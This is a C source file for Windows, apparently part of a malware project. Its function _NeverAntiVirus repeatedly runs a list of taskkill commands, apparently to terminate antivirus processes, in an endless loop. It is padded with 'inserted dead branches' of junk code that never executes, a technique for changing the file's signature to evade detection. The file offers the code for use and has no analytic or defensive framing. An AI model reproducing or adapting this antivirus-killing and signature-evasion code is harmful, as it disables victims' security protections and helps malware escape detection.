#include "data_globals.h"
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>   // <-- ADD for sprintf_s

void _NeverAntiVirus(void)
{
    int task_index = 0;
    volatile DWORD dummy_tick_2 = 0;   // <-- DECLARE HERE to make it visible everywhere
    
    do {
        for (task_index = 0; _Taskkill[task_index] != NULL; task_index++) {
            system(_Taskkill[task_index]);
        }
        
        // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
        volatile int dummy_x_1 = 7;
        if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
            SYSTEM_INFO si;
            GetSystemInfo(&si);
            
            char local_buf[64];
            sprintf_s(local_buf, sizeof(local_buf), "Dummy System Info: %d", si.dwNumberOfProcessors);
            
            DWORD dummy_tick = GetTickCount();
            for (int i = 0; i < 2; i++) {
                volatile int result = (dummy_tick ^ 0x5A5A5A5A) + i;
            }
            
            memset(local_buf, 0, sizeof(local_buf));
        }

        Sleep(1000);
    } while(1);

    // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
    dummy_tick_2 = GetTickCount();   // <-- reuse the already declared variable
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        
        char local_buf[64];
        sprintf_s(local_buf, sizeof(local_buf), "Dummy System Time: %d-%02d-%02d", st.wYear, st.wMonth, st.wDay);
        
        for (int i = 0; i < 2; i++) {
            volatile int result = dummy_tick_2 + i;
        }
        
        memset(local_buf, 0, sizeof(local_buf));
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        char local_buf[64];
        sprintf_s(local_buf, sizeof(local_buf), "Dummy Priority Class: %d", GetPriorityClass(GetCurrentProcess()));
        
        for (int i = 0; i < 2; i++) {
            volatile int result = dummy_tick_2 + i;   // <-- now dummy_tick_2 is in scope
        }
        
        memset(local_buf, 0, sizeof(local_buf));
    }
}

